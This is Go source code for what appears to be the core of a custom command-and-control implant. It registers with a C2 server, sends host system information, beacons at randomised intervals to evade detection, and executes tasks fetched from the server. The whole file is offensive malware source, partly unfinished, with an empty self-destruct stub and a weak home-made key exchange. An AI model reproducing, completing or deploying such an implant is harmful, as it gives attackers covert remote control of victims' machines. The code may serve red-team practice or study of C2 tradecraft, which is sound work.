package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"math/rand"
	"net/http"
	"time"
)

type ImplantConfig struct {
	Dwell             string  `json:"dwell"` // base interval time between C2 beacon check-ins (e.g., “5m” for a five-minute dwell before adding jitter)
	Jitter            float64 `json:"jitter"`
	p                 int
	g                 int
	server_public_key int
	//TODO: TIMEOUT, USEPROXY, ENDPOINTS - then fix in listener ImplantConfig as well
}

type Implant struct {
	ID     uint           `json:"id"`
	Config *ImplantConfig `json:"config"`
	SystemInfo
	TaskQueue *TaskQueue
	Results   []Result
	C2Communicator
	shared_prime       int
	shared_generator   int
	private_key        *big.Int
	implant_public_key *big.Int
}

// NewImplant instantiates an Implant, registers it, and wires up its communicator.
func NewImplant() (*Implant, error) {
	p := generatePrime()
	g := generatePrime()
	priv_key := generatePrivateKey()

	impl := &Implant{
		SystemInfo:         GetSystemInfo(),
		TaskQueue:          NewTaskQueue(),
		shared_prime:       p,
		shared_generator:   g,
		private_key:        priv_key,
		implant_public_key: calculatePublicKey(p, priv_key, g),
	}

	protocol, err := impl.register()
	if err != nil {
		return nil, fmt.Errorf("implant registration failed: %w", err)
	}

	comm, err := NewC2Communicator(protocol)
	if err != nil {
		return nil, err
	}
	impl.C2Communicator = comm

	return impl, nil
}

// register contacts the /register endpoint, fills impl.ID, and returns the c2's chosen communication protocol
// also generates a secret key, public key, and a shared secret key with c2 server
func (i *Implant) register() (string, error) {
	const endpoint = C2HTTPSURI + C2REGISTERENDPOINT

	body, err := json.Marshal(i)
	if err != nil {
		return "", fmt.Errorf("marshal payload: %w", err)
	}

	req, err := http.NewRequest(http.MethodPost, endpoint, bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("do request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		data, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("unexpected status %s: %s", resp.Status, string(data))
	}

	var out struct {
		ID           uint           `json:"id"`
		CommProtocol string         `json:"comm_protocol"`
		Config       *ImplantConfig `json:"config"`
	}
	if err = json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return "", fmt.Errorf("decode response: %w", err)
	}

	i.ID = out.ID
	i.Config = out.Config
	return out.CommProtocol, nil
}

// NextBeaconInterval computes the next beacon delay by applying up to ±Jitter
// around the base Dwell interval. The result is a uniformly random duration
// between Dwell×(1−Jitter) and Dwell×(1+Jitter).
//
// For example, if Dwell = 5*time.Minute and Jitter = 0.2, the returned duration
// will be chosen uniformly from [4m, 6m)./
func (i *Implant) NextBeaconInterval() time.Duration {
	// compute lower + upper
	minFactor := 1.0 - i.Config.Jitter
	maxFactor := 1.0 + i.Config.Jitter

	// pick a random float in [minFactor, maxFactor)
	factor := minFactor + rand.Float64()*(maxFactor-minFactor)

	// scale dwell by the factor and return
	d, _ := time.ParseDuration(i.Config.Dwell) // TODO: handle error, rename
	return time.Duration(float64(d) * factor)
}

// BeaconLoop continuously sleeps for a jittered Dwell interval and then calls Beacon().
func (i *Implant) BeaconLoop() error {
	for {
		fmt.Println("Starting beacon...")
		delay := i.NextBeaconInterval()
		time.Sleep(delay)

		// perform beacon
		// TODO: instead of returning TaskQueue, error, should return TaskQueue, malformedTasks []Task -> then use those to create a result
		var err error
		i.TaskQueue, err = i.C2Communicator.Beacon(i.ID, i.Results)
		if err != nil {
			return nil
		}
		i.Results = make([]Result, 0) // flush old results
		i.ExecuteTasks()
	}
}

func (i *Implant) ExecuteTasks() {
	for !i.TaskQueue.IsEmpty() {
		task := i.TaskQueue.Dequeue()
		result := task.Execute()
		result.TaskID = task.GetID()
		i.Results = append(i.Results, result)
	}
}

func (i *Implant) SelfDestruct() {

}
